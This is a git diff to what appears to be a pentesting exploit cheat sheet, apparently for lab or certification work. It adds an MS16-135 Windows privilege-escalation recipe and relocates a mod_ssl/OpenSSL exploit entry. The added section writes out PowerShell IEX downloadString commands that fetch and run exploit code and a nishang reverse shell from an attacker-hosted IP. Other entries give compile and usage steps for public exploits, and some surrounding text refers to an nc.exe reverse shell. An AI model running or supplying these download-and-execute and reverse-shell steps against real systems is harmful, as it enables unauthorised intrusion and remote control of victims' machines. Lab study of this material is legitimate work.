@@ -13,6 +13,29 @@ python exploit.py <ip> <port> <attacking-ip> <attacking-port>
 </p>
 </details>
 
+
+<details><summary>MS16-135 win23k</summary>
+<p>
+source: https://github.com/EmpireProject/Empire/raw/master/data/module_source/privesc/Invoke-MS16135.ps1
+
+
+1) Edit ps script at the end of the content to include the following command for executing exploit to trigger nishang reverse powershell (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) which is renamed as `shell.ps1`
+```powershell
+Invoke-MS16032 -Command "IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1')"
+```
+
+2) Host this file in webserver in your kali machine, you should also host tcp reverse named 'shell.ps1'
+
+3) In victim machine, run command :
+```powershell
+IEX (New-Object Net.WebClient).downloadString('http://10.10.14.32/Invoke-MS16135.ps1')
+```
+
+
+
+</p>
+</details>
+
 <details><summary>MS14-058 HttpFileServer 2.3.x RCE</summary>
 <p>
 source: https://www.exploit-db.com/exploits/37064
@@ -28,6 +51,7 @@ Upload nc.exe into victim machine and performs a reverse shell using nc.exe
 ```
 </p>
 </details>
+
 
 <details><summary>MS08-067 Python Remote Exploit</summary>
 <p>
@@ -60,6 +84,22 @@ To Compile:
 gcc 18411.c -o exploit
 ```
 
+
+<details><summary>Mod SSL 2.8.7 OpenSSL Exploit (openfartV2.c)</summary>
+<p>
+source: https://www.exploit-db.com/exploits/764
+commented out `#COMMAND2` variable out to download. Can be used seperately with ptrace-kmod for PrivEsc.
+
+Usage:
+1. compile code
+`gcc -o openfuck openfuckV2.c -lcrypto`
+_if you encounter missing ld error while compiling at victim machine, try checking PATH and make sure it is pointing to the 'ld' file_
+
+2. In your ptrace-kmod.c directory start webserver
+`python -m SimpleHTTPServer 80`
+</p>
+</details>
+
 </p>
 </details>
 
@@ -78,20 +118,6 @@ Works for 2.2.x and 2.4.x kernels.
 </p>
 </details>
 
-<details><summary>Mod SSL 2.8.7 OpenSSL Exploit (openfartV2.c)</summary>
-<p>
-source: https://www.exploit-db.com/exploits/764
-commented out `#COMMAND2` variable out to download. Can be used seperately with ptrace-kmod for PrivEsc.
-
-Usage:
-1. compile code
-`gcc -o openfuck openfuckV2.c -lcrypto`
-_if you encounter missing ld error while compiling at victim machine, try checking PATH and make sure it is pointing to the 'ld' file_
-
-2. In your ptrace-kmod.c directory start webserver
-`python -m SimpleHTTPServer 80`
-</p>
-</details>
 
 
 ### Other Exploits
